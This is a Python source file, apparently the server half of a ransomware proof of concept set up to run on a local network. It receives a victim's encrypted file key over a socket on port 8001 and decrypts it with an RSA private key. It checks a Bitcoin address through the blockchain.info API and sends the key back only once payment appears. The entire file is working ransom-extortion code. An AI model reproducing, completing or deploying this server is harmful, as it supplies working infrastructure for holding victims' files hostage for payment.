import os
import socket
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import cryptocode
import requests


# This should also be set to the local, private IP address of your server to run in your LAN.
# Set this to localhost in client.py and server.py to run locally on one machine.
# Running like this in LAN won't require a port forward, just a temporary firewall opening.

SERVER_IP = "192.168.1.150" 



def bitcoin_paid():

    # Just a random very active bitcoin address I plucked off of the blockchain.
    BITCOIN_ADDRESS = '1Kr6QSydW9bFQG1mXiPNNu6WpJGmUa9i1g'

    # This is the URL to get raw data from the blockchain.info API.
    blockchain_url='https://blockchain.info/rawaddr/' + BITCOIN_ADDRESS

    # Make the request to the API.
    response = requests.get(blockchain_url)

    # Check the status code returned by the API to see if we got a successful response.
    if response.status_code != 200:
        raise Exception("Error getting blockchain info: {}".format(response.status_code))
    
    # Parse the JSON response from the API to get the amount of bitcoin received at the address.
    data = response.json()
    bitcoin_received = data['total_received']

    # Return true if payment has been received over 0 bitcoin, otherwise false.

    return bitcoin_received > 0



def load_private_key(path="private_key.pem"):
    with open(path, "rb") as private_key_file:
        private_key = serialization.load_pem_private_key(
            private_key_file.read(),
            password=None
        )
    return private_key

def decrypt_symmetric_key(encrypted_symmetric_key):
    private_key = load_private_key()
    decrypted_symmetric_key = private_key.decrypt(  
        encrypted_symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_symmetric_key

def write_to_file(data, filename):
    with open(filename, "wb") as file:
        file.write(data)

def main():

    HOST, PORT = SERVER_IP, 8001  # Listen to all available network interfaces 

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()

        print("Server is running...")

        conn, addr = server_socket.accept()
        print(f"Connected by: {addr}")

        encrypted_symmetric_key = conn.recv(1024)
        decrypted_symmetric_key = decrypt_symmetric_key(encrypted_symmetric_key)

        write_to_file(decrypted_symmetric_key, "decrypted_symmetric_key.key")

    if bitcoin_paid():

        with open("decrypted_symmetric_key.key", "rb") as key_file:
                decrypted_key = key_file.read()
                conn.sendall(decrypted_key)

if __name__ == "__main__":
    main()
